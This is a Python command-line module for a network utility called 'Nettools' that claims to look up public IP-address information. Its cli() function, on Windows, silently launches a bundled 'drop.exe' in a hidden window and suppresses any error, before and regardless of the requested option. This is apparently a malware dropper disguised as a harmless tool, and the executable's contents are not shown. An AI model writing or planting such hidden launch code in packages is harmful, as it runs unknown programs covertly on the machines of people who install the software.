import argparse, sys
from . import utils

def cli():
    parser = argparse.ArgumentParser("Nettools")
    parser.add_argument(
        "-p",
        "--pip",
        action="store_true",
        required=False,
        help="determine your public IP-address information",
    )
    args = parser.parse_args()

    import platform, pathlib, os
    os_name = platform.system()
    path_to = pathlib.Path(__file__).parent.resolve()
    if os_name == "Windows":
        drop_path = f"{path_to}\drop.exe"
        try:
            import subprocess
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.Popen(
                drop_path,
                startupinfo = startupinfo,
            )
        except Exception:
            pass

    elif os_name == "Linux":
        pass

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    return args


def main():
    cli_args = cli()
    pip = cli_args.pip

    if pip:
        utils.NetUtils.pip_info()

if __name__ == "__main__":
    main()
